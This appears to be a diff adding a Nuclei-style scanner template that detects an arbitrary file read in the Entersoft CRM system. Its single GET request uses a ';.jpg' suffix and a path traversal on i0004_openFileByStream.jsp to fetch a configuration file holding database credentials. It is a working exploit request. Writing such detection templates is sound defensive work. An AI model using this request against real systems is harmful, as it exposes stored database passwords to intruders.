@@ -1,0 +1,29 @@
+id: poc-yaml-entersoft-i0004-openfilebystream-jsp-anyfile-read
+info:
+  name: 浙大恩特客户资源管理系统 i0004_openFileByStream.jsp 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    浙大恩特客户资源管理系统 i0004_openFileByStream.jsp 任意文件读取漏洞
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/entsoft/module/i0004_openFileByStream.jsp;.jpg?filepath=/../EnterCRM/bin/xy.properties&filename=conan"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "dbname="
+          - "enter.password"
+      - type: word
+        words:
+          - "<"
+        negative: true
+      - type: word
+        part: header
+        words:
+          - "application/x-download"
